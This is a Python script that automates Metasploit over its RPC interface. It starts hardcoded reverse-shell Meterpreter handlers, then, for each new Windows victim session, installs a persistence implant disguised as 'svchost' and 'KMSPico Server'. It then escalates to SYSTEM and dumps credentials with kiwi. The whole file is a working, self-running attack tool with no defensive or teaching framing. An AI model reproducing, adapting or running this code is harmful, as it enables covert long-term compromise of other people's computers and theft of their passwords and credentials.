import time
import traceback

print_orig = print

from tendo import singleton

me = singleton.SingleInstance()  # will sys.exit(-1) if other instance is running
f3212312 = open("log.txt", "a")


def print(*arg, **kwarg):
    global f3212312
    print_orig(*arg, **kwarg)
    print_orig(*arg, **kwarg, file=f3212312)
    f3212312.flush()


import subprocess
from pymetasploit3.msfrpc import MsfRpcClient

subprocess.Popen(
    "msfrpcd -U u8edh1289hwqwd -P k2ffUE912hjesqw -f -p 61529",
    shell=True,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)
# msfrpcd -U u8edh1289hwqwd -P k2ffUE912hjesqw -f -p 61529
print("waiting for msfrpcd...")
time.sleep(20)
print("connecting...")
client = MsfRpcClient(
    "k2ffUE912hjesqw",
    ssl=True,
    username="u8edh1289hwqwd",
    server="192.168.13.106",
    port=61529,
)
execed = []
print("connected.")

cid = client.consoles.console()
s1 = """handler -H 192.168.13.106 -P 7787 -p windows/x64/meterpreter/reverse_tcp
handler -H 192.168.13.106 -P 7788 -p windows/meterpreter/reverse_tcp"""
cid.write(s1)
# print(cid.read()['data'])

# s1 = client.sessions.list
# print(s1)


def exit_sess(session_id):
    print(f"exiting {session_id}...")
    s = """
sessions -k {}
""".format(
        session_id
    )
    cid.write(s)
    ret = ""
    cnt = 0
    while True:
        cnt += 1
        if cnt >= 30:
            print("cannot wait for busy when exit.")
            print(ret)
            return ret
        r = cid.read()
        time.sleep(0.2)
        ret = ret + r["data"]
        if not r["busy"]:
            print("fin.")
            print(ret)
            return ret


def persist(session_id, sess):
    print(f"persisting {sess}...")
    if (
        sess["via_exploit"] != "exploit/multi/handler"
        or sess["desc"] != "Meterpreter"
        or sess["platform"] != "windows"
        or (sess["arch"] not in ("x64", "x86"))
    ):
        print("error checking:", session_id, sess)
        return False
    if sess["arch"] == "x64":
        platform_spec = """
set payload windows/x64/meterpreter/reverse_tcp
set lport 7777
"""
    else:
        platform_spec = """
set payload windows/meterpreter/reverse_tcp
set lport 7778
"""
    s = (
        """
use exploit/windows/local/persistence
set lhost 192.168.13.106
set EXE_NAME svchost
set VBS_NAME KMSPico Server
set REG_NAME KMSPico Server
"""
        + platform_spec
        + """
set delay 600
set session {}
set STARTUP SYSTEM
run
sessions -C "getsystem"
sessions -C "load kiwi"
sessions -C "creds_all"
    """.format(
            session_id
        )
    )
    # set payload windows/meterpreter/reverse_tcp
    # set lport 7778
    cid.write(s)
    ret = ""
    cnt = 0
    while True:
        cnt += 1
        if cnt >= 40:
            print("cannot wait for busy when exit.")
            print(ret)
            return ret
        r = cid.read()
        time.sleep(0.2)
        ret = ret + r["data"]
        if not r["busy"]:
            print("fin.")
            print(ret)
            exit_sess(session_id)
            return ret


while True:
    try:
        for k, v in client.sessions.list.items():
            try:
                rmt = v["tunnel_peer"].split(":")[0]
            except Exception as e:
                print("rmt parsing error:", e)
                rmt = v["tunnel_peer"]
            if rmt not in execed:
                #            print("new!", v)
                execed.append(rmt)
                persist(k, v)
            else:
                print("sess already persisted, disconnect", v)
                exit_sess(k)
        #    print('sleep...')
        time.sleep(6)
    except Exception as e:
        print(traceback.format_exc())
        f3212312.close()
        exit()

"""
exploit64 = client.modules.use('exploit', 'exploit/multi/handler')
# exploit64.options
payload64 = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
payload64['LHOST']='192.168.13.106'
payload64['LPORT']='7777'
exploit64.execute(payload=payload64)

exploit32 = client.modules.use('exploit', 'exploit/multi/handler')
payload32 = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
payload32['LHOST']='192.168.13.106'
payload32['LPORT']='7778'
exploit32.execute(payload=payload32)
"""
